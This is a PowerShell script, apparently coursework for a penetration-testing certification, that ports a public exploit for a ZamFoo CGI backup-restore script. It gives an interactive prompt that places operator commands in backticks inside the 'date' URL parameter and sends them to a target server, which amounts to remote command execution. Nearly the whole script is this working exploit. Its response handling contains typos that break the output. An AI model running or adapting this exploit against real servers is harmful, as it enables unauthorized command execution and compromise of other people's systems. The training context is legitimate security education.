#https://www.exploit-db.com/exploits/38598
#https://www.securityfocus.com/bid/60826/info
#Part of the code is taken from Nishang 


<#
.SYNOPSIS
This powershell script is ported to take advantage of the following exploit https://www.exploit-db.com/exploits/38598.

.DESCRIPTION
This powershell script is ported to take advantage of the following exploit https://www.exploit-db.com/exploits/38598.


.EXAMPLE
PS C:\> . '.\5TH Assignment 2nd Exploit.ps1' somedomaingoinginfectedwiththisvuln.com

.LINK
https://www.exploit-db.com/exploits/38598
https://www.securityfocus.com/bid/60826/info
Part of the code is taken from Nishang 


.Note 
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3259



#>

[cmdletBinding()]

    param (
    [Parameter(Mandatory = $True , valuefrompipeline = $True)] $Targeturl
   
        
    )


    
 
 $cmd = ""

 while($cmd -ne "exit")
 {
     Write-Output "CommandInjectionExploit> "
     $cmd = read-host
     function post_http ($Targeturl, $parameters)
    {
       $FullURLrequest = "http://$targeturl/cgi/zamfoo/zamfoo_do_restore_zamfoo_backup.cgi?accounttorestore=account&date=" + '`' + $cmd + '`'
       Write-Output $FullURLrequest
       Write-Output "Running the following command: $cmd" 
        $http_request = Invoke-WebRequest -Uri $FullURLrequest 

        $session = $http_request.reponseText
        write-out "Command Respnose $session"

    }

        post_http $Targeturl

    }

  